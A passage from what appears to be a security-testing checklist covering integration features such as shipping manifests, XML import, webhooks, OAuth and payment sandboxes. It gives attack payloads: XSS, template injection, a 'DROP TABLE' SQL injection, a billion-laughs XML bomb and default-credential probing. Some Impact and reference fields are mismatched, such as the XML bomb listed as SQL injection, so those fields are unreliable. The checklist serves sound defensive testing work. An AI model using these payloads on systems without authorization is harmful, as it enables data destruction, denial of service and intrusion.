**Test Category:** Injection (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Shipping Provider Integration

**Test Steps:** 1. If shipping manifests are generated from order data inject payloads in manifest fields. 2. Check for injection in manifest generation systems. 3. Test for SSTI in manifest templates.

**Expected Result:** Application must sanitize all data used in shipping manifest generation and prevent injection through manifest templates.

**Payload Example:**

```
customs_description=<script>alert(1)</script>;item_name={{7*7}};shipper_name='; DROP TABLE shipments;--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Tplmap

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## INTG-179 — Import Data Bomb (Billion Laughs)
**Test Category:** Injection (WSTG-INPV-07) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Import / Export Data

**Test Steps:** 1. If import accepts XML create a billion laughs payload. 2. Upload the malicious XML. 3. Monitor server memory and CPU usage. 4. Check if entity expansion limits are enforced.

**Expected Result:** Application must implement XML entity expansion limits and maximum document size to prevent XML bomb denial-of-service attacks.

**Payload Example:**

```
<?xml version='1.0'?><!DOCTYPE lol [<!ENTITY lol1 "lol"><!ENTITY lol2 "&lol1;&lol1;"><!ENTITY lol3 "&lol2;&lol2;">...]<data>&lol9;</data>
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## INTG-180 — Webhook Payload Size Manipulation for DoS
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Webhook Configuration

**Test Steps:** 1. Trigger events that generate webhook payloads with user-controlled data. 2. Create extremely large data values to inflate webhook payload size. 3. Check for payload size limits.

**Expected Result:** Application must enforce maximum webhook payload size limits and truncate or reject oversized payloads.

**Payload Example:**

```
Create item with 1MB description that becomes part of webhook payload;check payload size limits
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## INTG-181 — OAuth Client ID Enumeration
**Test Category:** Information Disclosure (WSTG-INFO-04) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** OAuth App Registration

**Test Steps:** 1. Note OAuth client_id format. 2. Enumerate client IDs to discover registered applications. 3. Check if app details are exposed for enumerated IDs. 4. Test for predictable client_id generation.

**Expected Result:** Application must use non-sequential unpredictable client IDs and not expose application details for unauthenticated enumeration requests.

**Payload Example:**

```
Enumerate /api/oauth/apps?client_id=APP-0001 through APP-9999;check for sequential or predictable patterns
```

**Impact:** OAuth/SSO flaw -&gt; code/token theft or identity confusion -&gt; account takeover.

**Tools:** Burp Suite Intruder;ffuf

**References:** CWE-287; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); OAuth Security BCP (RFC 9700); PortSwigger

---

## INTG-182 — Sync Data Loss Prevention Bypass
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Sync with External Systems

**Test Steps:** 1. If DLP policies exist on sync data check if sensitive data can be synced despite restrictions. 2. Encode or obfuscate sensitive data. 3. Sync via alternative channels.

**Expected Result:** Application must enforce DLP policies consistently across all sync channels and detect obfuscation or encoding bypass attempts.

**Payload Example:**

```
Base64-encode sensitive data before sync;split sensitive data across multiple fields;use Unicode obfuscation
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-840; PortSwigger Business logic

---

## INTG-183 — Analytics Admin Panel Exposure
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Analytics Tools Integration

**Test Steps:** 1. Check if analytics admin panels are accessible without proper authorization. 2. Access analytics configuration endpoints. 3. Test for default credentials on analytics dashboards.

**Expected Result:** Application must restrict analytics admin panel access to authorized users and change default credentials.

**Payload Example:**

```
Access /analytics/admin;/grafana/;/kibana/;/amplitude/admin without proper credentials;test admin:admin
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;DirBuster;Default Credential Lists

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## INTG-184 — Payment Gateway Sandbox Environment Exploitation
**Test Category:** Security Misconfiguration (WSTG-CONF-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Payment Gateway Integration

**Test Steps:** 1. Check if sandbox and production payment environments can be mixed. 2. Use sandbox payment tokens in production context. 3. Verify strict environment separation.

**Expected Result:** Application must strictly separate payment sandbox and production environments and reject cross-environment token usage.

**Payload Example:**

```
Use sandbox payment_intent or test tokens in production payment endpoints;mix environment API keys
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite;Postman

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---
